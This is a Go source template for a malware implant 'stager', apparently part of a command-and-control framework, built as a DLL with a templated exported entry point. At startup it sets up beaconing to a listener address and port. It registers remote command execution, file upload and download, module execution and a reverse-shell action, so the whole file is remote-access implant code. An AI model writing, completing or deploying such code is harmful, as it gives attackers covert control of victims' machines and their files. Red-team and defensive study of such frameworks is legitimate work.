package main

import (
	actions "golang_payload/actions"
	stagerClass "golang_payload/stager"
	"C"
)

const (
	stagerId        string = "{{stager.id}}"
	listenerAddress string = "{{stager.listener.address}}"
	listenerPort    string = "{{stager.listener.port}}"
	ssl             string = "{{stager.listener.ssl | lower}}"
	uid             string = "{{identifier.uid}}"
	sleepTime       string = "{{stager.options['sleep-time']}}"
	retries         string = "{{stager.retries}}"
	delay           string = "{{stager.delay}}"
	userAgent       string = "{{stager.options['user-agent']}}"
)

var stager *stagerClass.Stager

func init() {
	stager = &stagerClass.Stager{}
	// setup config
	stager.Setup(stagerId, uid, sleepTime, retries, delay)
	// set server url
	stager.SetUrl(listenerAddress, listenerPort, ssl)
	// set user agent
	stager.SetUserAgent(userAgent)
	// register actions
	stager.RegisterAction("rce", actions.RunCommandFromTask)
	stager.RegisterAction("download", actions.DownloadFile)
	stager.RegisterAction("upload", actions.UploadFile)
	stager.RegisterAction("module", actions.ExecuteModule)
	stager.RegisterAction("reverse-shell", actions.ReverseShell)

	//TODO: add dir listing action

}

//export {{stager.options["exported_function"]}}
func {{stager.options["exported_function"]}}() {
	// run stager
	stager.Run()
}

func main() {}